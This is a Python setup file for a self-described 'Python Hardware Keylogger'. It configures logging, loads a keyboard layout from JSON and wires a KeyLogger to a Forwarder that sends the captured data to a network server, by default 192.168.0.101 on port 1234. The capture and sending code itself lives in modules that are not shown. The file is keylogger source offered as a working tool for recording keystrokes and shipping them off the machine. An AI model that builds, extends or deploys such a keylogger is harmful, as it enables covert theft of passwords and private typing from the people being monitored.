import sys
import logging
import argparse
from src.DataHandler import DataHandler
from src.KeyLogger import KeyLogger
from src.Forwarder import Forwarder
import json


class Logger:
    __slots__ = ["root_handler", "__mode"]

    def __init__(self, mode: str) -> None:
        self.__mode: str = mode
        self.root_handler: logging = logging.getLogger()
        if mode == "debug" or mode == "d":
            self.root_handler.setLevel(logging.DEBUG)
        elif mode is None or mode == "production" or mode == "p":
            self.root_handler.setLevel(logging.INFO)
        handler: logging.StreamHandler = logging.StreamHandler(sys.stdout)
        handler.setLevel(logging.DEBUG)
        formatter: logging.Formatter = logging.Formatter(
            "%(asctime)s:%(levelname)s : %(message)s"
        )
        handler.setFormatter(formatter)
        self.root_handler.addHandler(handler)
        logging.info("Starting Python Hardware Keylogger")


class Setup:
    __slots__ = ["logger", "__keylogger"]

    def __init__(self, args) -> None:
        keyboard_layout: dict[int, list[int, int]] = self.read_keyboard_layout(
            (lambda k: k if k else "mini_keyboard")(args.keyboard)
        )
        self.logger: Logger = Logger((lambda m: m if m else None)(args.mode))
        forwarder: Forwarder = Forwarder(
            server_ip=(lambda i: i if i else "192.168.0.101")(args.ip),
            port=(lambda p: p if p else "1234")(args.port),
        )
        self.__keylogger: KeyLogger = KeyLogger(
            keyboard_layout=keyboard_layout,
            data_handler=DataHandler(),
            forwarder=forwarder,
        )
        logging.info("Setup Complete")

    def get_keylogger(self) -> KeyLogger:
        return self.__keylogger

    @staticmethod
    def read_keyboard_layout(name: str = "mini_keyboard") -> dict[int, list[int, int]]:
        with open(f"data/{name}.json", "r") as file:
            keyboard_layout: dict[int, list[int, int]] = json.load(file)
        return keyboard_layout
